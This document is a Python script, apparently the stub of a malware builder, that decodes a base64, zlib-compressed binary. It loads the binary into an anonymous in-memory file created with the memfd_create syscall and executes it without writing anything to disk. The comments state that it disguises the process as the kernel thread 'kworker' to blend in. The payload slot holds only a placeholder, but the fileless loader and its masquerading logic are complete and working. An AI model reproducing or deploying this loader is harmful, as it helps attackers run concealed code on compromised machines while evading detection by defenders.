import base64
import ctypes
import os
import platform
import sys
import zlib


# --- CONFIGURATION (Will be injected by builder) ---
# We use a placeholder string that our builder will replace
PAYLOAD_B64 = "REPLACE_ME_WITH_B64_BINARY"
# ---------------------------------------------------

def run_memfd():
    # 1. Decode Payload
    print("[*] Decoding payload...")

    try:
        # Decode Base64
        compressed_data = base64.b64decode(PAYLOAD_B64)
        # Decompress Zlib (Inflate)
        binary_data = zlib.decompress(compressed_data)
    except Exception as e:
        print(f"[-] Decoding failed: {e}")
        sys.exit(1)

    print(f"[*] Payload size: {len(binary_data)} bytes")

    # 2. Prepare Syscalls - Detect CPU Architecture
    arch = platform.machine()

    if arch == "x86_64":
        SYS_MEMFD_CREATE = 319
    elif arch == "aarch64":
        SYS_MEMFD_CREATE = 279
    else:
        # Fallback or unknown
        print(f"[-] Unknown architecture: {arch}")
        sys.exit(1)
    
    libc = ctypes.CDLL(None)
    
    # 3. Create Anonymous File
    # "kworker/u4:1" is a fake name to blend in with kernel processes
    fd = libc.syscall(SYS_MEMFD_CREATE, b"kworker/u4:1", 0)
    print(f"[*] memfd created with fd: {fd}")
    
    if fd == -1:
        print("[-] memfd_create syscall failed!")
        sys.exit(1)

    # 4. Write Binary to RAM
    os.write(fd, binary_data)
    
    # 5. Execute
    fd_path = f"/proc/self/fd/{fd}"
    print(f"[*] Executing from memfd: {fd_path}")
    try:
        # Replace current process with the binary
        # argv[0] = "kworker"
        os.execv(fd_path, ["kworker"])
    except OSError as e:
        print(f"[-] Exec failed: {e.errno} - {e.strerror}")
        sys.exit(1)

    print("[+] Execution completed.")

if __name__ == "__main__":
    run_memfd()